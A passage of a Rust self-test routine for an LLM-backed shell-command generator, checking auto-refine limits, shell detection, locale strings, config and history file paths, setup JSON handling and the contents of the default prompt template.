    // than `MAX_AUTO_REFINE_ROUNDS` automatic refine turns.
    let rounds = |v: Option<serde_json::Value>| crate::config::parse_auto_refine_rounds(v.as_ref());
    check(
        "auto_refine_rounds: default constant is 3",
        crate::config::DEFAULT_AUTO_REFINE_ROUNDS == 3,
    );
    check(
        "auto_refine_rounds: max constant is 10",
        crate::config::MAX_AUTO_REFINE_ROUNDS == 10,
    );
    check("auto_refine_rounds: missing → 3", rounds(None) == 3);
    check(
        "auto_refine_rounds: 3 → 3",
        rounds(Some(serde_json::json!(3))) == 3,
    );
    check(
        "auto_refine_rounds: 10 → 10",
        rounds(Some(serde_json::json!(10))) == 10,
    );
    check(
        "auto_refine_rounds: 0 → 0 (off)",
        rounds(Some(serde_json::json!(0))) == 0,
    );
    check(
        "auto_refine_rounds: 42 → 10 (clamped)",
        rounds(Some(serde_json::json!(42))) == 10,
    );
    check(
        "auto_refine_rounds: -4 → 1 (clamped)",
        rounds(Some(serde_json::json!(-4))) == 1,
    );
    check(
        "auto_refine_rounds: numeric string accepted",
        rounds(Some(serde_json::json!("7"))) == 7,
    );
    check(
        "auto_refine_rounds: non-numeric string → 3",
        rounds(Some(serde_json::json!("nonsense"))) == 3,
    );
    check(
        "auto_refine_rounds: bool → 3",
        rounds(Some(serde_json::json!(true))) == 3,
    );
    check(
        "auto_refine_rounds: float → 3",
        rounds(Some(serde_json::json!(2.5))) == 3,
    );

    // Test 20j (g-014): the per-intent gate on automatic refine — one user
    // intent may spend exactly `limit` rounds and round N+1 is never started;
    // limit 0 (auto_refine:false or rounds 0) never refines at all.
    {
        use crate::AutoRefineStep::{Disabled, Exhausted, Refine};
        check(
            "auto-refine gate: 0 (off) never refines",
            auto_refine_step(0, 0) == Disabled && auto_refine_step(0, 7) == Disabled,
        );
        check(
            "auto-refine gate: default limit 3 allows rounds 1, 2, 3",
            auto_refine_step(3, 0) == Refine(1)
                && auto_refine_step(3, 1) == Refine(2)
                && auto_refine_step(3, 2) == Refine(3),
        );
        check(
            "auto-refine gate: limit 3 is exhausted at 3 (never a 4th round)",
            auto_refine_step(3, 3) == Exhausted(3) && auto_refine_step(3, 4) == Exhausted(3),
        );
        check(
            "auto-refine gate: limit 1 stops after one round",
            auto_refine_step(1, 0) == Refine(1) && auto_refine_step(1, 1) == Exhausted(1),
        );
        check(
            "auto-refine gate: limit 5 allows a fifth round",
            auto_refine_step(5, 4) == Refine(5) && auto_refine_step(5, 5) == Exhausted(5),
        );
        // Walk each budget to the end: exactly `limit` refines, then a hard
        // stop that reports the limit — the shape of the REPL's chain.
        for limit in [1u32, 2, 3, 5, 10] {
            let mut used = 0u32;
            let mut refines = 0u32;
            let mut stop = None;
            loop {
                match auto_refine_step(limit, used) {
                    Refine(n) => {
                        used = n;
                        refines += 1;
                    }
                    Exhausted(total) => {
                        stop = Some(total);
                        break;
                    }
                    Disabled => break,
                }
            }
            check(
                &format!(
                    "auto-refine gate: limit {} spends {} rounds then stops",
                    limit, limit
                ),
                refines == limit && stop == Some(limit),
            );
        }
    }

    // Test 21: is_bare_cd — first token of the comment-stripped command
    check("is_bare_cd: bare cd", is_bare_cd("cd"));
    check(
        "is_bare_cd: cd with args",
        is_bare_cd("cd /d %USERPROFILE%"),
    );
    check("is_bare_cd: leading spaces", is_bare_cd("   cd /tmp"));
    check("is_bare_cd: with comment", is_bare_cd("cd /tmp # go home"));
    check("is_bare_cd: cd.. is not bare cd", !is_bare_cd("cd.."));
    check("is_bare_cd: echo cd is not bare cd", !is_bare_cd("echo cd"));

    // Test 22: COMMA_EVAL_SHELL overrides the reported shell dialect (the
    // eval wrapper sets it so generation matches the shell that evals);
    // an empty value falls through. Saved/restored around the checks.
    let saved_eval_shell = std::env::var("COMMA_EVAL_SHELL").ok();
    set_env("COMMA_EVAL_SHELL", "powershell");
    check(
        "get_shell: COMMA_EVAL_SHELL wins",
        get_shell() == "powershell",
    );
    set_env("COMMA_EVAL_SHELL", "");
    let with_empty = get_shell();
    unset_env("COMMA_EVAL_SHELL");
    let without = get_shell();
    check(
        "get_shell: empty COMMA_EVAL_SHELL ignored",
        with_empty == without && !without.is_empty(),
    );
    // Test 22b: shell_command() mirrors get_shell() for execution.
    // Saves/restores SHELL, COMMA_EVAL_SHELL and PSModulePath around the checks.
    let saved_shell = std::env::var("SHELL").ok();
    let saved_ps_module_path = std::env::var("PSModulePath").ok();
    unset_env("COMMA_EVAL_SHELL");
    if cfg!(unix) {
        set_env("SHELL", "/bin/zsh");
        let (prog, args) = shell_command();
        check(
            "shell_command: uses $SHELL on Unix",
            prog == "/bin/zsh" && args == ["-c"],
        );
    }
    if cfg!(windows) {
        unset_env("SHELL");
        unset_env("PSModulePath");
        let (prog, args) = shell_command();
        check(
            "shell_command: falls back to cmd /C on Windows",
            prog == "cmd" && args == ["/C"],
        );
        set_env(
            "PSModulePath",
            "C:\\Users\\x\\Documents\\PowerShell\\Modules",
        );
        let (prog2, args2) = shell_command();
        check(
            "shell_command: detects PowerShell via PSModulePath",
            prog2 == "powershell" && args2 == ["-c"],
        );
    }
    set_env("COMMA_EVAL_SHELL", "powershell");
    let (prog2, args2) = shell_command();
    check(
        "shell_command: COMMA_EVAL_SHELL wins",
        prog2 == "powershell" && args2 == ["-c"],
    );
    match &saved_eval_shell {
        Some(v) => set_env("COMMA_EVAL_SHELL", v),
        None => unset_env("COMMA_EVAL_SHELL"),
    }
    match &saved_shell {
        Some(v) => set_env("SHELL", v),
        None => unset_env("SHELL"),
    }
    match &saved_ps_module_path {
        Some(v) => set_env("PSModulePath", v),
        None => unset_env("PSModulePath"),
    }

    // Test 23: every embedded locale substitutes named placeholders.
    // rust-i18n v3 only replaces %{name} — a `{}` placeholder would show up
    // literally, so a successful substitution also proves the locale file
    // uses the right syntax for these keys.
    let locales: Vec<&str> = rust_i18n::available_locales!();
    // g-012: every UI locale ships with the binary, so an embedded locale
    // silently losing its file fails here.
    for code in ["en", "zh", "ja", "ko", "fr", "de", "es", "pt", "ru"] {
        check(
            &format!("locale {} embedded", code),
            locales.contains(&code),
        );
    }

    for locale in locales.iter() {
        let running = t!("info.running", locale => locale, "cmd" => "MARKER_CMD");
        check(
            &format!("locale {}: running substitutes %{{cmd}}", locale),
            running.contains("MARKER_CMD"),
        );
        let exit = t!("error.exit_code", locale => locale, "code" => 42);
        check(
            &format!("locale {}: exit_code substitutes %{{code}}", locale),
            exit.contains("42"),
        );
        let mismatch = t!(
            "update.checksum_mismatch",
            locale => locale,
            "name" => "N", "expected" => "E", "actual" => "A"
        );
        check(
            &format!("locale {}: checksum_mismatch substitutes all", locale),
            mismatch.contains('N') && mismatch.contains('E') && mismatch.contains('A'),
        );

        // g-012: the REPL welcome line is the only place that announces the
        // new flow (a generated command goes straight into the action menu),
        // so both of its placeholders must substitute in every locale.
        let welcome = t!(
            "interactive.welcome",
            locale => locale,
            "m" => "MARK_MODEL", "s" => "MARK_STYLE"
        );
        check(
            &format!("locale {}: welcome substitutes %{{m}}/%{{s}}", locale),
            welcome.contains("MARK_MODEL") && welcome.contains("MARK_STYLE"),
        );
        // g-005 att-003: history is on by default, so this notice is printed on
        // every REPL entry — all nine locales must define it, substitute the
        // path and state both ways to turn persistence off.
        let hist_notice = t!(
            "interactive.history_notice",
            locale => locale,
            "p" => "MARK_PATH"
        );
        check(
            &format!("locale {}: history_notice substitutes %{{p}}", locale),
            hist_notice.contains("MARK_PATH"),
        );
        check(
            &format!("locale {}: history_notice documents how to disable", locale),
            hist_notice.contains("\"history\": false") && hist_notice.contains("--setup"),
        );
        check(
            &format!("locale {}: history_notice is translated", locale),
            *locale == "en"
                || hist_notice
                    != t!("interactive.history_notice", locale => "en", "p" => "MARK_PATH"),
        );
        // Auto-refine strings must exist in every locale (a missing key falls
        // back silently in production, so `--test` is the only guard).
        let notice = t!("interactive.auto_refine_notice", locale => locale, "code" => 9);
        check(
            &format!(
                "locale {}: auto_refine_notice substitutes %{{code}}",
                locale
            ),
            notice.contains('9'),
        );
        // g-014: the notice shows the current round and the budget, so both
        // placeholders must substitute in every locale.
        let notice_rounds = t!(
            "interactive.auto_refine_notice",
            locale => locale,
            "code" => 9, "round" => 2, "total" => 3
        );
        check(
            &format!(
                "locale {}: auto_refine_notice substitutes %{{round}}/%{{total}}",
                locale
            ),
            notice_rounds.contains("2") && notice_rounds.contains("3"),
        );
        // The exhausted notice (budget used up → stop and hand back) is new in
        // g-014 and must be translated everywhere: a missing key silently falls
        // back to English, so `--test` is the only guard.
        let exhausted = t!("interactive.auto_refine_exhausted", locale => locale, "rounds" => 4);
        check(
            &format!(
                "locale {}: auto_refine_exhausted substitutes %{{rounds}}",
                locale
            ),
            exhausted.contains('4'),
        );
        check(
            &format!("locale {}: auto_refine_exhausted is translated", locale),
            *locale == "en"
                || exhausted
                    != t!("interactive.auto_refine_exhausted", locale => "en", "rounds" => 4),
        );
        check(
            &format!(
                "locale {}: auto_refine_desc documents auto_refine_rounds",
                locale
            ),
            t!("help.auto_refine_desc", locale => locale).contains("auto_refine_rounds"),
        );
        let auto_body = t!(
            "interactive.auto_refine_body",
            locale => locale,
            "cmd" => "CMD_MARK", "code" => 9, "output" => "OUT_MARK"
        );
        check(
            &format!("locale {}: auto_refine_body substitutes all", locale),
            auto_body.contains("CMD_MARK")
                && auto_body.contains("OUT_MARK")
                && auto_body.contains('9'),
        );
        let auto_body_empty = t!(
            "interactive.auto_refine_body_empty",
            locale => locale,
            "cmd" => "CMD_MARK", "code" => 9
        );
        check(
            &format!("locale {}: auto_refine_body_empty substitutes all", locale),
            auto_body_empty.contains("CMD_MARK") && auto_body_empty.contains('9'),
        );
        let menu_auto = t!("setup.menu_auto_refine", locale => locale, "value" => "VALUE_MARK");
        check(
            &format!("locale {}: menu_auto_refine substitutes %{{value}}", locale),
            menu_auto.contains("VALUE_MARK"),
        );
        // g-013: the pty-fallback notice is printed by the capture path (Windows,
        // or a Unix host without a usable pty), so it must be translated too — a
        // locale missing the key silently falls back to English.
        let pty_fallback = t!("info.pty_fallback", locale => locale, "e" => "ERR_MARK");
        check(
            &format!("locale {}: pty_fallback substitutes %{{e}}", locale),
            pty_fallback.contains("ERR_MARK"),
        );
        check(
            &format!("locale {}: pty_fallback is translated", locale),
            *locale == "en"
                || pty_fallback != t!("info.pty_fallback", locale => "en", "e" => "ERR_MARK"),
        );
        for key in [
            "error.no_command_refine",
            "error.refine_requires_text",
            "help.refine_desc",
            "help.auto_refine_desc",
        ] {
            let value = t!(key, locale => locale);
            check(&format!("locale {}: {} present", locale, key), value != key);
        }
        // g-005 att-002: Ctrl-C strings. `exit_confirm` labels the [y/N] prompt
        // shown after an interrupted step; `interrupt_pending` replaces the
        // spinner text while a step that cannot be aborted is still running.
        let exit_confirm = t!("interactive.exit_confirm", locale => locale);
        check(
            &format!("locale {}: exit_confirm present", locale),
            !exit_confirm.is_empty() && exit_confirm != "interactive.exit_confirm",
        );
        check(
            &format!("locale {}: exit_confirm is translated", locale),
            *locale == "en" || exit_confirm != t!("interactive.exit_confirm", locale => "en"),
        );
        let interrupt_pending = t!("interactive.interrupt_pending", locale => locale);
        check(
            &format!("locale {}: interrupt_pending present", locale),
            !interrupt_pending.is_empty() && interrupt_pending != "interactive.interrupt_pending",
        );
        check(
            &format!("locale {}: interrupt_pending is translated", locale),
            *locale == "en"
                || interrupt_pending != t!("interactive.interrupt_pending", locale => "en"),
        );
    }

    // Test 24: config_path — XDG location preferred on Unix, legacy
    // ~/.local/bin/,.config.json kept as fallback for existing installs.
    // Uses a fake HOME in a temp dir; XDG_CONFIG_HOME is saved/restored.
    // Skipped on Windows, where the platform default is %APPDATA%\comma.
    if !cfg!(windows) {
        use crate::config::config_path;
        let fake = std::env::temp_dir().join(format!("comma-test-home-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&fake);
        let home = fake.to_string_lossy().to_string();
        let xdg = fake.join(".config/comma/config.json");
        let legacy = fake.join(".local/bin/,.config.json");
        let saved_xdg = std::env::var("XDG_CONFIG_HOME").ok();
        unset_env("XDG_CONFIG_HOME");

        // Neither exists → XDG path (where new installs write the template)
        check("config_path: defaults to XDG", config_path(&home) == xdg);
        check(
            "prompt_path: defaults to XDG",
            crate::prompt::prompt_path(&home) == fake.join(".config/comma/prompt.md"),
        );

        // Only legacy exists → legacy wins (existing install)
        std::fs::create_dir_all(legacy.parent().unwrap()).unwrap();
        std::fs::write(&legacy, "{}").unwrap();
        check("config_path: legacy fallback", config_path(&home) == legacy);
        std::fs::write(fake.join(".local/bin/,.prompt.md"), "x").unwrap();
        check(
            "prompt_path: legacy fallback",
            crate::prompt::prompt_path(&home) == fake.join(".local/bin/,.prompt.md"),
        );

        // Both exist → XDG wins
        std::fs::create_dir_all(xdg.parent().unwrap()).unwrap();
        std::fs::write(&xdg, "{}").unwrap();
        check("config_path: XDG preferred", config_path(&home) == xdg);

        // Cache: defaults to ~/.cache/comma/cache.json, legacy fallback works
        use crate::config::cache_path;
        let cache_xdg = fake.join(".cache/comma/cache.json");
        std::fs::remove_file(&xdg).unwrap();
        check(
            "cache_path: defaults to XDG cache",
            cache_path(&home) == cache_xdg,
        );
        std::fs::write(fake.join(".local/bin/,.cache.json"), "{}").unwrap();
        check(
            "cache_path: legacy fallback",
            cache_path(&home) == fake.join(".local/bin/,.cache.json"),
        );

        // Portable install: a file next to the executable beats ~/.local/bin
        let exe_cfg = crate::config::exe_dir(&home).join(",.config.json");
        std::fs::write(&exe_cfg, "{}").unwrap();
        check(
            "config_path: executable-adjacent (portable)",
            config_path(&home) == exe_cfg,
        );
        let _ = std::fs::remove_file(&exe_cfg);

        // XDG_CONFIG_HOME honored
        let custom = fake.join("custom-xdg");
        set_env("XDG_CONFIG_HOME", &custom);
        std::fs::create_dir_all(custom.join("comma")).unwrap();
        std::fs::write(custom.join("comma/config.json"), "{}").unwrap();
        check(
            "config_path: XDG_CONFIG_HOME honored",
            config_path(&home) == custom.join("comma/config.json"),
        );

        match &saved_xdg {
            Some(v) => set_env("XDG_CONFIG_HOME", v),
            None => unset_env("XDG_CONFIG_HOME"),
        }
        let _ = std::fs::remove_dir_all(&fake);
    }

    // ── Reasoning enum ──────────────────────────────────────────────────────

    // Tokens(0) defaults
    let r = Reasoning::Tokens(0);
    check("reasoning tokens(0) budget_tokens", r.budget_tokens() == 0);
    check("reasoning tokens(0) effort_str", r.effort_str() == "none");

    // Tokens mapping to effort
    let r = Reasoning::Tokens(512);
    check("reasoning tokens(512) effort", r.effort_str() == "low");
    let r = Reasoning::Tokens(1024);
    check("reasoning tokens(1024) effort", r.effort_str() == "low");
    let r = Reasoning::Tokens(2048);
    check("reasoning tokens(2048) effort", r.effort_str() == "low");
    let r = Reasoning::Tokens(4096);
    check("reasoning tokens(4096) effort", r.effort_str() == "low");
    let r = Reasoning::Tokens(8192);
    check("reasoning tokens(8192) effort", r.effort_str() == "medium");
    let r = Reasoning::Tokens(16384);
    check("reasoning tokens(16384) effort", r.effort_str() == "medium");
    let r = Reasoning::Tokens(32768);
    check("reasoning tokens(32768) effort", r.effort_str() == "high");

    // Effort mapping to budget_tokens
    let r = Reasoning::Effort("none".into());
    check("reasoning effort(none) budget", r.budget_tokens() == 0);
    let r = Reasoning::Effort("low".into());
    check("reasoning effort(low) budget", r.budget_tokens() == 1024);
    let r = Reasoning::Effort("medium".into());
    check("reasoning effort(medium) budget", r.budget_tokens() == 2048);
    let r = Reasoning::Effort("high".into());
    check("reasoning effort(high) budget", r.budget_tokens() == 4096);
    let r = Reasoning::Effort("unknown".into());
    check("reasoning effort(unknown) budget", r.budget_tokens() == 0);

    // Effort passthrough
    let r = Reasoning::Effort("low".into());
    check("reasoning effort(low) passthrough", r.effort_str() == "low");
    let r = Reasoning::Effort("custom".into());
    check(
        "reasoning effort(custom) passthrough",
        r.effort_str() == "custom",
    );

    // Default reasoning is Tokens(0) = disabled
    let r = Reasoning::default();
    check("reasoning default is disabled", r.budget_tokens() == 0);
    check("reasoning default effort is none", r.effort_str() == "none");

    // ── strip_markdown_fences ───────────────────────────────────────────────
    check(
        "strip fences: basic",
        strip_markdown_fences("```bash\nls -la\n```") == "ls -la",
    );
    check(
        "strip fences: no lang tag",
        strip_markdown_fences("```\nls -la\n```") == "ls -la",
    );
    check(
        "strip fences: no fences",
        strip_markdown_fences("ls -la") == "ls -la",
    );
    check(
        "strip fences: opening only",
        strip_markdown_fences("```bash\nls -la") == "ls -la",
    );
    check(
        "strip fences: leading text",
        strip_markdown_fences("Here:\n```bash\nls -la\n```") == "Here:\n```bash\nls -la\n```",
    );
    check(
        "strip fences: trailing newline",
        strip_markdown_fences("```bash\nls -la\n```\n") == "ls -la",
    );

    // ── setup.rs: entries <-> json, move_item, backup ───────────────────────
    let cfg_json = serde_json::json!({
        "providers": {
            "cerebras": { "base_url": "https://api.cerebras.ai/v1", "auth_token": "k1" },
            "local": { "base_url": "http://localhost:11434/v1", "auth_token": "k2", "api_style": "openai" }
        },
        "models": [
            { "provider": "cerebras", "model": "gemma-4-31b", "retries": 2 },
            { "provider": "local", "model": "qwen3" }
        ],
        "prefer": { "grep": ["rg"] },
        "custom_key": "keepme"
    });
    let entries = crate::setup::json_to_entries(&cfg_json);
    check("setup json_to_entries: 2 entries", entries.len() == 2);
    check(
        "setup json_to_entries: joined fields",
        entries[0].provider == "cerebras"
            && entries[0].auth_token == "k1"
            && entries[0].model == "gemma-4-31b"
            && entries[0].retries == 2,
    );
    check(
        "setup json_to_entries: api_style kept",
        entries[1].api_style.as_deref() == Some("openai"),
    );
    check(
        "setup json_to_entries: retries defaults to 1",
        entries[1].retries == 1,
    );

    let search = crate::setup::SetupSearch::from_json(&cfg_json);
    check(
        "setup search: default off",
        search.provider == "off" && search.to_json().is_none(),
    );
    let rebuilt = crate::setup::entries_to_json(&entries, &search, false, &cfg_json);
    check(
        "setup entries_to_json: preserves other keys",
        rebuilt["prefer"]["grep"][0] == "rg" && rebuilt["custom_key"] == "keepme",
    );
    check(
        "setup entries_to_json: providers rebuilt",
        rebuilt["providers"]["cerebras"]["auth_token"] == "k1"
            && rebuilt["providers"]["local"]["api_style"] == "openai",
    );
    check(
        "setup entries_to_json: model order kept",
        rebuilt["models"][0]["provider"] == "cerebras" && rebuilt["models"][1]["model"] == "qwen3",
    );
    check(
        "setup entries_to_json: retries 1 omitted",
        rebuilt["models"][1].get("retries").is_none() && rebuilt["models"][0]["retries"] == 2,
    );
    check(
        "setup entries_to_json: search dropped when off",
        rebuilt.get("search").is_none(),
    );
    check(
        "setup round-trip: entries equal",
        crate::setup::json_to_entries(&rebuilt) == entries,
    );

    // mask_secret: head + last two chars, short secrets fully hidden
    check(
        "setup mask_secret: head…tail",
        crate::setup::mask_secret("sk-abcdef123456") == "sk-a…56",
    );
    check(
        "setup mask_secret: short hidden",
        crate::setup::mask_secret("sk") == "…" && crate::setup::mask_secret("").is_empty(),
    );

    // Legacy single-model format upgrades to providers+models on save
    let legacy_json = serde_json::json!({
        "base_url": "https://api.anthropic.com", "auth_token": "sk", "model": "claude-x", "lang": "zh"
    });
    let legacy_entries = crate::setup::json_to_entries(&legacy_json);
    check(
        "setup legacy: one default entry",
        legacy_entries.len() == 1
            && legacy_entries[0].provider == "default"
            && legacy_entries[0].auth_token == "sk"
            && legacy_entries[0].model == "claude-x",
    );
    let upgraded = crate::setup::entries_to_json(&legacy_entries, &search, false, &legacy_json);
    check(
        "setup legacy: upgraded format",
        upgraded["models"][0]["provider"] == "default"
            && upgraded["providers"]["default"]["base_url"] == "https://api.anthropic.com",
    );
    check(
        "setup legacy: old keys removed, lang kept",
        upgraded.get("base_url").is_none()
            && upgraded.get("auth_token").is_none()
            && upgraded.get("model").is_none()
            && upgraded["lang"] == "zh",
    );

    let search_on = crate::setup::SetupSearch {
        provider: "tavily".into(),
        api_key: Some("tv".into()),
        base_url: None,
        max_results: Some(7),
    };
    let with_search = crate::setup::entries_to_json(&entries, &search_on, false, &cfg_json);
    check(
        "setup search: written",
        with_search["search"]["provider"] == "tavily"
            && with_search["search"]["api_key"] == "tv"
            && with_search["search"]["max_results"] == 7,
    );

    // The REPL-history toggle must be written explicitly: the merge in
    // entries_to_json would otherwise drop the user's choice, and unrelated
    // keys must survive either way.
    let history_on_json = crate::setup::entries_to_json(&entries, &search_on, true, &cfg_json);
    check(
        "setup entries_to_json: history on written, other keys kept",
        history_on_json["history"] == true
            && history_on_json["custom_key"] == "keepme"
            && history_on_json["search"]["provider"] == "tavily",
    );
    let history_off_json = crate::setup::entries_to_json(&entries, &search_on, false, &cfg_json);
    check(
        "setup entries_to_json: history off written explicitly",
        history_off_json["history"] == false,
    );

    let mut v = vec![1, 2, 3];
    check(
        "move_item: down",
        crate::setup::move_item(&mut v, 0, false) && v == [2, 1, 3],
    );
    check(
        "move_item: up",
        crate::setup::move_item(&mut v, 1, true) && v == [1, 2, 3],
    );
    check(
        "move_item: up at top is no-op",
        !crate::setup::move_item(&mut v, 0, true) && v == [1, 2, 3],
    );
    check(
        "move_item: down at bottom is no-op",
        !crate::setup::move_item(&mut v, 2, false) && v == [1, 2, 3],
    );

    // Timestamped backup + atomic save
    check(
        "utc_timestamp: epoch",
        crate::setup::utc_timestamp(0) == "19700101-000000",
    );
    check(
        "utc_timestamp: known date",
        crate::setup::utc_timestamp(1754604000) == "20250807-220000",
    );
    let tmp_cfg =
        std::env::temp_dir().join(format!("comma-test-setup-{}.json", std::process::id()));
    std::fs::write(&tmp_cfg, r#"{"old": true}"#).unwrap();
    let new_json = serde_json::json!({"new": true});
    let backup = crate::setup::save_config(&tmp_cfg, &new_json).unwrap();
    check("setup save: backup created", backup.is_some());
    let backup = backup.unwrap();
    check(
        "setup save: backup has original content",
        std::fs::read_to_string(&backup).unwrap() == r#"{"old": true}"#,
    );
    check(
        "setup save: new content written",
        std::fs::read_to_string(&tmp_cfg)
            .unwrap()
            .contains("\"new\": true"),
    );
    check(
        "setup save: backup name pattern",
        backup
            .file_name()
            .unwrap()
            .to_str()
            .unwrap()
            .starts_with("comma-test-setup-")
            && backup.extension().and_then(|e| e.to_str()) == Some("bak"),
    );
    let _ = std::fs::remove_file(&tmp_cfg);
    let _ = std::fs::remove_file(&backup);
    let tmp_missing = std::env::temp_dir().join(format!(
        "comma-test-setup-missing-{}.json",
        std::process::id()
    ));
    let _ = std::fs::remove_file(&tmp_missing);
    check(
        "setup save: no backup for missing file",
        crate::setup::save_config(&tmp_missing, &new_json)
            .unwrap()
            .is_none()
            && tmp_missing.is_file(),
    );
    let _ = std::fs::remove_file(&tmp_missing);

    // ── history.rs: REPL input history (ON by default) ──────────────────────
    // Path resolution ($XDG_STATE_HOME wins, else the state dir under HOME) has
    // no exe-adjacent/legacy fallback, so there is nothing to test there. The
    // Windows branch is compile-time and cannot be exercised here.
    if !cfg!(windows) {
        let prev_state = std::env::var("XDG_STATE_HOME").ok();
        set_env("XDG_STATE_HOME", "/tmp/comma-xdg-state-test");
        check(
            "history path: XDG_STATE_HOME override",
            crate::config::history_path("/home/tester")
                == std::path::Path::new("/tmp/comma-xdg-state-test/comma/history"),
        );
        set_env("XDG_STATE_HOME", "");
        check(
            "history path: empty XDG_STATE_HOME ignored",
            crate::config::history_path("/home/tester")
                == std::path::Path::new("/home/tester/.local/state/comma/history"),
        );
        unset_env("XDG_STATE_HOME");
        check(
            "history path: default under HOME",
            crate::config::history_path("/home/tester")
                == std::path::Path::new("/home/tester/.local/state/comma/history"),
        );
        match prev_state {
            Some(v) => set_env("XDG_STATE_HOME", v),
            None => unset_env("XDG_STATE_HOME"),
        }
    }

    let hist = std::env::temp_dir().join(format!("comma-test-history-{}", std::process::id()));
    let _ = std::fs::remove_file(&hist);

    // g-005 att-003: the feature is ON by default, so the enabled path is now
    // the default path — `save_if_enabled(true, ..)` must create the file.
    crate::history::save_if_enabled(true, Some(&hist), &["default intent".to_string()]);
    check(
        "history: enabled writes the file (default on)",
        hist.exists(),
    );
    check(
        "history: enabled reads back what was saved",
        crate::history::load_if_enabled(true, Some(&hist)) == ["default intent"],
    );
    let _ = std::fs::remove_file(&hist);

    // Privacy invariant (unchanged): explicit `false` means no file is created
    // and nothing is read, even when a file already exists on disk.
    std::fs::write(&hist, "old intent\n").unwrap();
    crate::history::save_if_enabled(false, Some(&hist), &["secret intent".to_string()]);
    check(
        "history: explicit false neither writes nor reads",
        crate::history::load(&hist) == ["old intent"]
            && crate::history::load_if_enabled(false, Some(&hist)).is_empty(),
    );
    let _ = std::fs::remove_file(&hist);
    crate::history::save_if_enabled(false, Some(&hist), &["secret intent".to_string()]);
    check("history: explicit false creates no file", !hist.exists());
    check(
        "history: missing file → empty",
        crate::history::load(&hist).is_empty(),
    );
    check(
        "history: HOME-less path is a no-op",
        crate::history::load_if_enabled(true, None).is_empty(),
    );

    // The welcome-block disclosure: shown only while persistence is on, and it
    // must name the file, the config key and the `, --setup` toggle (the
    // literal key names stay untranslated, so these assertions hold in every
    // locale).
    let hist_path = std::path::Path::new("/state/comma/history");
    let notice_on = crate::history_notice(true, Some(hist_path));
    check(
        "history notice: shown when enabled, names path + key + setup",
        notice_on.as_deref().is_some_and(|n| {
            n.contains("\"history\": false")
                && n.contains("--setup")
                && n.contains("/state/comma/history")
        }),
    );
    check(
        "history notice: suppressed while disabled",
        crate::history_notice(false, Some(hist_path)).is_none(),
    );
    check(
        "history notice: HOME-less still discloses (generic path)",
        crate::history_notice(true, None)
            .as_deref()
            .is_some_and(|n| n.contains("history") && n.contains("--setup")),
    );

    // Corrupt input (non-UTF-8, truncated) must never panic or abort startup.
    std::fs::write(&hist, b"first\nsecond\n\xff").unwrap();
    check(
        "history: non-UTF-8 → empty, no panic",
        crate::history::load(&hist).is_empty(),
    );
    std::fs::write(&hist, "first\nsecond").unwrap();
    check(
        "history: truncated last line still loads",
        crate::history::load(&hist) == ["first", "second"],
    );

    // Round-trip, embedded-newline flattening, cap and 0600 permissions.
    let wanted: Vec<String> = (0..3).map(|i| format!("intent {}", i)).collect();
    crate::history::save(&hist, &wanted);
    check("history: round-trip", crate::history::load(&hist) == wanted);
    crate::history::save(&hist, &["one\ntwo".to_string()]);
    check(
        "history: embedded newline flattened",
        crate::history::load(&hist) == ["one two"],
    );

    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        let mode = std::fs::metadata(&hist).map(|m| m.permissions().mode() & 0o777);
        check("history: file mode 0600", mode.ok() == Some(0o600));
        // A pre-existing looser file is tightened on the next save.
        std::fs::set_permissions(&hist, std::fs::Permissions::from_mode(0o644)).unwrap();
        crate::history::save(&hist, &wanted);
        let mode = std::fs::metadata(&hist).map(|m| m.permissions().mode() & 0o777);
        check(
            "history: loose mode tightened to 0600",
            mode.ok() == Some(0o600),
        );
    }

    let many: Vec<String> = (0..crate::history::MAX_HISTORY + 5)
        .map(|i| format!("entry {}", i))
        .collect();
    crate::history::save(&hist, &many);
    let loaded = crate::history::load(&hist);
    check(
        "history: capped to MAX_HISTORY, newest kept",
        loaded.len() == crate::history::MAX_HISTORY
            && loaded[0] == "entry 5"
            && loaded[crate::history::MAX_HISTORY - 1]
                == format!("entry {}", crate::history::MAX_HISTORY + 4),
    );
    let _ = std::fs::remove_file(&hist);

    // ── prompt.rs: template picking ─────────────────────────────────────────
    let default = crate::prompt::pick_template(None, None, None);
    check(
        "prompt: bare default",
        default == crate::prompt::DEFAULT_PROMPT,
    );
    let with_add = crate::prompt::pick_template(None, None, Some("Always use sudo."));
    check(
        "prompt: additional appended",
        with_add.starts_with(crate::prompt::DEFAULT_PROMPT)
            && with_add.ends_with("Always use sudo."),
    );
    check(
        "prompt: empty additional ignored",
        crate::prompt::pick_template(None, None, Some("  ")) == crate::prompt::DEFAULT_PROMPT,
    );
    let same_legacy = format!("{}\n", crate::prompt::DEFAULT_PROMPT);
    check(
        "prompt: identical legacy ignored",
        crate::prompt::pick_template(None, Some(&same_legacy), Some("EXTRA")).ends_with("EXTRA"),
    );
    check(
        "prompt: customized legacy honored",
        crate::prompt::pick_template(None, Some("MY OWN PROMPT"), Some("EXTRA")) == "MY OWN PROMPT",
    );
    check(
        "prompt: full_prompt wins over all",
        crate::prompt::pick_template(Some("FULL OVERRIDE"), Some("MY OWN PROMPT"), Some("EXTRA"))
            == "FULL OVERRIDE",
    );
    check(
        "prompt: blank full_prompt ignored",
        crate::prompt::pick_template(Some("  "), None, None) == crate::prompt::DEFAULT_PROMPT,
    );
    check(
        "prompt: warns against shell-specific env vars",
        crate::prompt::DEFAULT_PROMPT.contains("$ZSH_CUSTOM")
            && crate::prompt::DEFAULT_PROMPT.contains("unexported variables"),
    );
    check(
        "prompt: PowerShell syntax guidance",
        crate::prompt::DEFAULT_PROMPT.contains("PowerShell")
            && crate::prompt::DEFAULT_PROMPT.contains("NOT `&&`")
            && crate::prompt::DEFAULT_PROMPT.contains("$env:VAR"),
    );
    // g-014: the prompt must state that the child shell has no shell history,
    // name the history builtins/expansions that cannot work there, point at
    // the history FILE as the way to show history, and warn that
    // HISTFILE/HISTCMD are not exported.
    check(
        "prompt: states the child shell has no shell history",
        crate::prompt::DEFAULT_PROMPT.contains("NO shell history"),
    );
    check(
        "prompt: names the unusable history builtins and expansions",
        crate::prompt::DEFAULT_PROMPT.contains("`history`")
            && crate::prompt::DEFAULT_PROMPT.contains("fc -l")
            && crate::prompt::DEFAULT_PROMPT.contains("!!")
            && crate::prompt::DEFAULT_PROMPT.contains("!n"),
    );
    check(
        "prompt: tells the model to read the history file instead",
        crate::prompt::DEFAULT_PROMPT.contains("READ THE HISTORY FILE")
            && crate::prompt::DEFAULT_PROMPT.contains("{{HOME}}/.zsh_history")
            && crate::prompt::DEFAULT_PROMPT.contains("{{HOME}}/.bash_history"),
    );
    check(
